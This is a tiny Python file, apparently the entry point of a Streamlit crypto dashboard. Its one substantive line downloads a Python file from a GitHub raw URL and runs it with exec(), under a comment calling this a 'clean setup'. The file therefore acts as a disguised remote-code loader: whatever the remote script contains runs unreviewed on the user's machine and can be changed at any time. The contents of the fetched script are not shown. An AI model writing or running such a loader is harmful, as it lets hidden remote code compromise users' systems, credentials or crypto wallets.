import urllib.request
import streamlit as st

# Automating code loading via a clean setup
exec(urllib.request.urlopen("https://raw.githubusercontent.com/vijaysamriya783-del/crypto-ai-dashboard/main/app_v2.py").read())
